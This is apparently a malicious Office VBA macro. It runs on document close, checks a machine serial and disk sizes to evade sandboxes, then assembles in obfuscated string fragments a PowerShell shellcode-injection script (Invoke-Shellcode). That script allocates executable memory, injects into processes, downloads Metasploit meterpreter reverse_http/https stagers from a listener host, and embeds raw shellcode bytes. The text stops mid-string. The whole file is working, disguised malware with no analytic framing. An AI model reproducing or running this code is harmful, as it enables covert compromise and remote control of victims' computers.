Sub AutoClose()
        kOm
End Sub

Public Function kOm() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim doHWf As String
        doHWf = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        doHWf = doHWf + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        doHWf = doHWf + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        doHWf = doHWf + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        doHWf = doHWf + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        doHWf = doHWf + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        doHWf = doHWf + "    $Shellcode,
    [Parameter( ParameterSetName ="
        doHWf = doHWf + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        doHWf = doHWf + "reter/reverse_http',
                  'windows/me"
        doHWf = doHWf + "terpreter/reverse_https',
                  Ignore"
        doHWf = doHWf + "Case = $True )]
    [String]
    $Payload = 'windo"
        doHWf = doHWf + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        doHWf = doHWf + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        doHWf = doHWf + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        doHWf = doHWf + " = $True,
                ParameterSetName = 'Meta"
        doHWf = doHWf + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        doHWf = doHWf + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        doHWf = doHWf + "datory = $True,
                ParameterSetName ="
        doHWf = doHWf + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        doHWf = doHWf + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        doHWf = doHWf + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        doHWf = doHWf + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        doHWf = doHWf + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        doHWf = doHWf + "sion\Internet Settings').'User Agent',
    [Parame"
        doHWf = doHWf + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        doHWf = doHWf + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        doHWf = doHWf + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        doHWf = doHWf + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        doHWf = doHWf + "$False,
    [Switch]
    $Force = $False
)
    Set"
        doHWf = doHWf + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        doHWf = doHWf + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        doHWf = doHWf + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        doHWf = doHWf + "meters['Payload'].Attributes |
            Where-O"
        doHWf = doHWf + "bject {$_.TypeId -eq [System.Management.Automation"
        doHWf = doHWf + ".ValidateSetAttribute]}
        foreach ($Payload "
        doHWf = doHWf + "in $AvailablePayloads.ValidValues)
        {
     "
        doHWf = doHWf + "       New-Object PSObject -Property @{ Payloads ="
        doHWf = doHWf + " $Payload }
        }
        Return
    }
    if "
        doHWf = doHWf + "( $PSBoundParameters['ProcessID'] )
    {
        "
        doHWf = doHWf + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        doHWf = doHWf + "-Null
    }
    function Local:Get-DelegateType
  "
        doHWf = doHWf + "  {
        Param
        (
            [OutputTyp"
        doHWf = doHWf + "e([Type])]
            [Parameter( Position = 0)]
"
        doHWf = doHWf + "            [Type[]]
            $Parameters = (Ne"
        doHWf = doHWf + "w-Object Type[](0)),
            [Parameter( Posit"
        doHWf = doHWf + "ion = 1 )]
            [Type]
            $ReturnT"
        doHWf = doHWf + "ype = [Void]
        )
        $Domain = [AppDomai"
        doHWf = doHWf + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        doHWf = doHWf + "t System.Reflection.AssemblyName('ReflectedDelegat"
        doHWf = doHWf + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        doHWf = doHWf + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        doHWf = doHWf + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        doHWf = doHWf + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        doHWf = doHWf + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        doHWf = doHWf + "der.DefineType('MyDelegateType', 'Class, Public, S"
        doHWf = doHWf + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        doHWf = doHWf + "egate])
        $ConstructorBuilder = $TypeBuilder"
        doHWf = doHWf + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        doHWf = doHWf + "ic', [System.Reflection.CallingConventions]::Stand"
        doHWf = doHWf + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        doHWf = doHWf + "mplementationFlags('Runtime, Managed')
        $Me"
        doHWf = doHWf + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        doHWf = doHWf + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        doHWf = doHWf + ", $Parameters)
        $MethodBuilder.SetImplement"
        doHWf = doHWf + "ationFlags('Runtime, Managed')
        Write-Outpu"
        doHWf = doHWf + "t $TypeBuilder.CreateType()
    }
    function Loc"
        doHWf = doHWf + "al:Get-ProcAddress
    {
        Param
        (
 "
        doHWf = doHWf + "           [OutputType([IntPtr])]
            [Par"
        doHWf = doHWf + "ameter( Position = 0, Mandatory = $True )]
       "
        doHWf = doHWf + "     [String]
            $Module,
            [Pa"
        doHWf = doHWf + "rameter( Position = 1, Mandatory = $True )]
      "
        doHWf = doHWf + "      [String]
            $Procedure
        )
  "
        doHWf = doHWf + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        doHWf = doHWf + ".GetAssemblies() |
            Where-Object { $_.G"
        doHWf = doHWf + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        doHWf = doHWf + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        doHWf = doHWf + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        doHWf = doHWf + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        doHWf = doHWf + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        doHWf = doHWf + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        doHWf = doHWf + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        doHWf = doHWf + "eropServices.HandleRef], [String]))
        $Kern3"
        doHWf = doHWf + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        doHWf = doHWf + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        doHWf = doHWf + "ndleRef = New-Object System.Runtime.InteropService"
        doHWf = doHWf + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        doHWf = doHWf + "Output $GetProcAddress.Invoke($null, @([System.Run"
        doHWf = doHWf + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        doHWf = doHWf + "ure))
    }
    function Local:Emit-CallThreadStub"
        doHWf = doHWf + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        doHWf = doHWf + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        doHWf = doHWf + "chitecture / 8
        function Local:ConvertTo-Li"
        doHWf = doHWf + "ttleEndian ([IntPtr] $Address)
        {
         "
        doHWf = doHWf + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        doHWf = doHWf + "           $Address.ToString("X$($IntSizePtr*2)") "
        doHWf = doHWf + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        doHWf = doHWf + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        doHWf = doHWf + " } }
            [System.Array]::Reverse($LittleEn"
        doHWf = doHWf + "dianByteArray)
            Write-Output $LittleEnd"
        doHWf = doHWf + "ianByteArray
        }
        $CallStub = New-Obj"
        doHWf = doHWf + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        doHWf = doHWf + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        doHWf = doHWf + "                   # MOV   QWORD RAX, &shellcode
 "
        doHWf = doHWf + "           $CallStub += ConvertTo-LittleEndian $Ba"
        doHWf = doHWf + "seAddr       # &shellcode
            $CallStub +="
        doHWf = doHWf + " 0xFF,0xD0                              # CALL  RA"
        doHWf = doHWf + "X
            $CallStub += 0x6A,0x00              "
        doHWf = doHWf + "                # PUSH  BYTE 0
            $CallSt"
        doHWf = doHWf + "ub += 0x48,0xB8                              # MOV"
        doHWf = doHWf + "   QWORD RAX, &ExitThread
            $CallStub +="
        doHWf = doHWf + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        doHWf = doHWf + "ead
            $CallStub += 0xFF,0xD0            "
        doHWf = doHWf + "                  # CALL  RAX
        }
        el"
        doHWf = doHWf + "se
        {
            [Byte[]] $CallStub = 0xB8"
        doHWf = doHWf + "                           # MOV   DWORD EAX, &she"
        doHWf = doHWf + "llcode
            $CallStub += ConvertTo-LittleEn"
        doHWf = doHWf + "dian $BaseAddr       # &shellcode
            $Cal"
        doHWf = doHWf + "lStub += 0xFF,0xD0                              # "
        doHWf = doHWf + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        doHWf = doHWf + "                        # PUSH  BYTE 0
           "
        doHWf = doHWf + " $CallStub += 0xB8                                "
        doHWf = doHWf + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        doHWf = doHWf + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        doHWf = doHWf + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        doHWf = doHWf + "                          # CALL  EAX
        }
  "
        doHWf = doHWf + "      Write-Output $CallStub
    }
    function Lo"
        doHWf = doHWf + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        doHWf = doHWf + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        doHWf = doHWf + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        doHWf = doHWf + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        doHWf = doHWf + "        Throw "Unable to open a process handle for"
        doHWf = doHWf + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        doHWf = doHWf + "lse
        if ($64bitCPU) # Only perform theses c"
        doHWf = doHWf + "hecks if CPU is 64-bit
        {
            $IsWo"
        doHWf = doHWf + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        doHWf = doHWf + "-Null
            if ((!$IsWow64) -and $PowerShell"
        doHWf = doHWf + "32bit)
            {
                Throw 'Unable"
        doHWf = doHWf + " to inject 64-bit shellcode from within 32-bit Pow"
        doHWf = doHWf + "ershell. Use the 64-bit version of Powershell if y"
        doHWf = doHWf + "ou want this to work.'
            }
            e"
        doHWf = doHWf + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        doHWf = doHWf + "  {
                if ($Shellcode32.Length -eq 0)"
        doHWf = doHWf + "
                {
                    Throw 'No s"
        doHWf = doHWf + "hellcode was placed in the $Shellcode32 variable!'"
        doHWf = doHWf + "
                }
                $Shellcode = $S"
        doHWf = doHWf + "hellcode32
            }
            else # 64-bit"
        doHWf = doHWf + " process
            {
                if ($Shellc"
        doHWf = doHWf + "ode64.Length -eq 0)
                {
            "
        doHWf = doHWf + "        Throw 'No shellcode was placed in the $She"
        doHWf = doHWf + "llcode64 variable!'
                }
            "
        doHWf = doHWf + "    $Shellcode = $Shellcode64
            }
      "
        doHWf = doHWf + "  }
        else # 32-bit CPU
        {
          "
        doHWf = doHWf + "  if ($Shellcode32.Length -eq 0)
            {
   "
        doHWf = doHWf + "             Throw 'No shellcode was placed in the"
        doHWf = doHWf + " $Shellcode32 variable!'
            }
           "
        doHWf = doHWf + " $Shellcode = $Shellcode32
        }
        $Remo"
        doHWf = doHWf + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        doHWf = doHWf + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        doHWf = doHWf + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        doHWf = doHWf + ")
        {
            Throw "Unable to allocate "
        doHWf = doHWf + "shellcode memory in PID: $ProcessID"
        }
   "
        doHWf = doHWf + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        doHWf = doHWf + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        doHWf = doHWf + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        doHWf = doHWf + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        doHWf = doHWf + "      {
            $CallStub = Emit-CallThreadStu"
        doHWf = doHWf + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        doHWf = doHWf + "    else
        {
            $CallStub = Emit-Ca"
        doHWf = doHWf + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        doHWf = doHWf + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        doHWf = doHWf + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        doHWf = doHWf + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        doHWf = doHWf + "(!$RemoteStubAddr)
        {
            Throw "Un"
        doHWf = doHWf + "able to allocate thread call stub memory in PID: $"
        doHWf = doHWf + "ProcessID"
        }
        $WriteProcessMemory.I"
        doHWf = doHWf + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        doHWf = doHWf + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        doHWf = doHWf + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        doHWf = doHWf + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        doHWf = doHWf + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        doHWf = doHWf + "  {
            Throw "Unable to launch remote thr"
        doHWf = doHWf + "ead in PID: $ProcessID"
        }
        $CloseHa"
        doHWf = doHWf + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        doHWf = doHWf + "on Local:Inject-LocalShellcode
    {
        if ($"
        doHWf = doHWf + "PowerShell32bit) {
            if ($Shellcode32.Le"
        doHWf = doHWf + "ngth -eq 0)
            {
                Throw 'N"
        doHWf = doHWf + "o shellcode was placed in the $Shellcode32 variabl"
        doHWf = doHWf + "e!'
                return
            }
         "
        doHWf = doHWf + "   $Shellcode = $Shellcode32
        }
        els"
        doHWf = doHWf + "e
        {
            if ($Shellcode64.Length -e"
        doHWf = doHWf + "q 0)
            {
                Throw 'No shell"
        doHWf = doHWf + "code was placed in the $Shellcode64 variable!'
   "
        doHWf = doHWf + "             return
            }
            $She"
        doHWf = doHWf + "llcode = $Shellcode64
        }
        $BaseAddre"
        doHWf = doHWf + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        doHWf = doHWf + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        doHWf = doHWf + "X)
        if (!$BaseAddress)
        {
          "
        doHWf = doHWf + "  Throw "Unable to allocate shellcode memory in PI"
        doHWf = doHWf + "D: $ProcessID"
        }
        [System.Runtime.I"
        doHWf = doHWf + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        doHWf = doHWf + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        doHWf = doHWf + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        doHWf = doHWf + "  if ($PowerShell32bit)
        {
            $Cal"
        doHWf = doHWf + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        doHWf = doHWf + "adAddr 32
        }
        else
        {
       "
        doHWf = doHWf + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        doHWf = doHWf + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        doHWf = doHWf + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        doHWf = doHWf + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        doHWf = doHWf + "X)
        if (!$CallStubAddress)
        {
      "
        doHWf = doHWf + "      Throw "Unable to allocate thread call stub.""
        doHWf = doHWf + "
        }
        [System.Runtime.InteropServices"
        doHWf = doHWf + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        doHWf = doHWf + "allStub.Length)
        $ThreadHandle = $CreateThr"
        doHWf = doHWf + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        doHWf = doHWf + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        doHWf = doHWf + "dHandle)
        {
            Throw "Unable to la"
        doHWf = doHWf + "unch thread."
        }
        $WaitForSingleObje"
        doHWf = doHWf + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        doHWf = doHWf + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        doHWf = doHWf + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        doHWf = doHWf + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        doHWf = doHWf + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        doHWf = doHWf + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        doHWf = doHWf + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        doHWf = doHWf + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        doHWf = doHWf + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        doHWf = doHWf + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        doHWf = doHWf + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        doHWf = doHWf + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        doHWf = doHWf + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        doHWf = doHWf + "  else
    {
        $64bitCPU = $false
    }
    "
        doHWf = doHWf + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        doHWf = doHWf + "l32bit = $true
    }
    else
    {
        $Power"
        doHWf = doHWf + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        doHWf = doHWf + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        doHWf = doHWf + "owerShell32bit) {
            $RootInvocation = $M"
        doHWf = doHWf + "yInvocation.Line
            $Response = $True
   "
        doHWf = doHWf + "         if ( $Force -or ( $Response = $psCmdlet.S"
        doHWf = doHWf + "houldContinue( "Do you want to launch the payload "
        doHWf = doHWf + "from x86 Powershell?",
                   "Attempt"
        doHWf = doHWf + " to execute 32-bit shellcode from 64-bit Powershel"
        doHWf = doHWf + "l. Note: This process takes about one minute. Be p"
        doHWf = doHWf + "atient! You will also see some artifacts of the sc"
        doHWf = doHWf + "ript loading in the other process." ) ) ) { }
    "
        doHWf = doHWf + "        if ( !$Response )
            {
          "
        doHWf = doHWf + "      Return
            }
            if ($MyInvo"
        doHWf = doHWf + "cation.BoundParameters['Force'])
            {
   "
        doHWf = doHWf + "             $Command = "function $($MyInvocation."
        doHWf = doHWf + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        doHWf = doHWf + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        doHWf = doHWf + "   }
            else
            {
              "
        doHWf = doHWf + "  $Command = "function $($MyInvocation.InvocationN"
        doHWf = doHWf + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        doHWf = doHWf + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        doHWf = doHWf + "
            $CommandBytes = [System.Text.Encoding"
        doHWf = doHWf + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        doHWf = doHWf + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        doHWf = doHWf + "           $Execute = '$Command' + " | $Env:windir"
        doHWf = doHWf + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        doHWf = doHWf + "oProfile -Command -"
            Invoke-Expression"
        doHWf = doHWf + " -Command $Execute | Out-Null
            Return
 "
        doHWf = doHWf + "       }
        $Response = $True
        if ( $F"
        doHWf = doHWf + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        doHWf = doHWf + "Do you know what you're doing?",
               "A"
        doHWf = doHWf + "bout to download Metasploit payload '$($Payload)' "
        doHWf = doHWf + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        doHWf = doHWf + "  if ( !$Response )
        {
            Return
 "
        doHWf = doHWf + "       }
        switch ($Payload)
        {
     "
        doHWf = doHWf + "       'windows/meterpreter/reverse_http'
        "
        doHWf = doHWf + "    {
                $SSL = ''
            }
    "
        doHWf = doHWf + "        'windows/meterpreter/reverse_https'
      "
        doHWf = doHWf + "      {
                $SSL = 's'
               "
        doHWf = doHWf + " [System.Net.ServicePointManager]::ServerCertifica"
        doHWf = doHWf + "teValidationCallback = {$True}
            }
     "
        doHWf = doHWf + "   }
        if ($Legacy)
        {
            $R"
        doHWf = doHWf + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        doHWf = doHWf + "
        } else {
            $CharArray = 48..57 "
        doHWf = doHWf + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        doHWf = doHWf + "         $SumTest = $False
            while ($Sum"
        doHWf = doHWf + "Test -eq $False)
            {
                $Ge"
        doHWf = doHWf + "neratedUri = $CharArray | Get-Random -Count 4
    "
        doHWf = doHWf + "            $SumTest = (([int[]] $GeneratedUri | M"
        doHWf = doHWf + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        doHWf = doHWf + "  }
            $RequestUri = -join $GeneratedUri
"
        doHWf = doHWf + "            $Request = "http$($SSL)://$($Lhost):$("
        doHWf = doHWf + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        doHWf = doHWf + "ew-Object Uri($Request)
        $WebClient = New-O"
        doHWf = doHWf + "bject System.Net.WebClient
        $WebClient.Head"
        doHWf = doHWf + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        doHWf = doHWf + "roxy)
        {
            $WebProxyObject = New-"
        doHWf = doHWf + "Object System.Net.WebProxy
            $ProxyAddre"
        doHWf = doHWf + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        doHWf = doHWf + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        doHWf = doHWf + "oxyServer
            if ($ProxyAddress)
         "
        doHWf = doHWf + "   {
                $WebProxyObject.Address = $Pr"
        doHWf = doHWf + "oxyAddress
                $WebProxyObject.UseDefa"
        doHWf = doHWf + "ultCredentials = $True
                $WebClientO"
        doHWf = doHWf + "bject.Proxy = $WebProxyObject
            }
      "
        doHWf = doHWf + "  }
        try
        {
            [Byte[]] $Sh"
        doHWf = doHWf + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        doHWf = doHWf + "}
        catch
        {
            Throw "$($Er"
        doHWf = doHWf + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        doHWf = doHWf + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        doHWf = doHWf + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        doHWf = doHWf + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        doHWf = doHWf + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        doHWf = doHWf + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        doHWf = doHWf + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        doHWf = doHWf + "                             0x52,0x0c,0x8b,0x52,0"
        doHWf = doHWf + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        doHWf = doHWf + "x31,0xc0,
                                  0xac,0"
        doHWf = doHWf + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        doHWf = doHWf + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        doHWf = doHWf + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        doHWf = doHWf + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        doHWf = doHWf + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        doHWf = doHWf + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        doHWf = doHWf + "x8b,
                                  0x01,0xd6,0"
        doHWf = doHWf + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        doHWf = doHWf + "x38,0xe0,0x75,0xf4,
                              "
        doHWf = doHWf + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        doHWf = doHWf + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        doHWf = doHWf + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        doHWf = doHWf + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        doHWf = doHWf + "                                  0x5b,0x5b,0x61,0"
        doHWf = doHWf + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        doHWf = doHWf + "xeb,0x86,0x5d,
                                  0"
        doHWf = doHWf + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        doHWf = doHWf + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        doHWf = doHWf + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        doHWf = doHWf + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        doHWf = doHWf + "                             0x80,0xfb,0xe0,0x75,0"
        doHWf = doHWf + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        doHWf = doHWf + "xd5,0x63,
                                  0x61,0"
        doHWf = doHWf + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        doHWf = doHWf + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        doHWf = doHWf + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        doHWf = doHWf + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        doHWf = doHWf + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        doHWf = doHWf + "                             0x20,0x48,0x8b,0x72,0"
        doHWf = doHWf + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        doHWf = doHWf + "x31,0xc0,
                                  0xac,0"
        doHWf = doHWf + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        doHWf = doHWf + "x41,0x01,0xc1,0xe2,0xed,
                         "
        doHWf = doHWf + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        doHWf = doHWf + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        doHWf = doHWf + "                        0x00,0x00,0x00,0x48,0x85,0"
        doHWf = doHWf + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        doHWf = doHWf + "x44,
                                  0x8b,0x40,0"
        doHWf = doHWf + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        doHWf = doHWf + "x8b,0x34,0x88,0x48,
                              "
        doHWf = doHWf + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        doHWf = doHWf + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        doHWf = doHWf + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        doHWf = doHWf + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        doHWf = doHWf + "                                  0x8b,0x40,0x24,0"
        doHWf = doHWf + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        doHWf = doHWf + "x40,0x1c,0x49,
                                  0"
        doHWf = doHWf + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        doHWf = doHWf + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        doHWf = doHWf + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        doHWf = doHWf + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        doHWf = doHWf + "                             0x59,0x5a,0x48,0x8b,0"
        doHWf = doHWf + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        doHWf = doHWf + "x00,0x00,
                                  0x00,0"
        doHWf = doHWf + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        doHWf = doHWf + "x00,0x41,0xba,0x31,0x8b,
                         "
        doHWf = doHWf + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        doHWf = doHWf + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        doHWf = doHWf + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        doHWf = doHWf + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        doHWf = doHWf + "x47,
                                  0x13,0x72,0"
        doHWf = doHWf + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        doHWf = doHWf + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        doHWf = doHWf + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
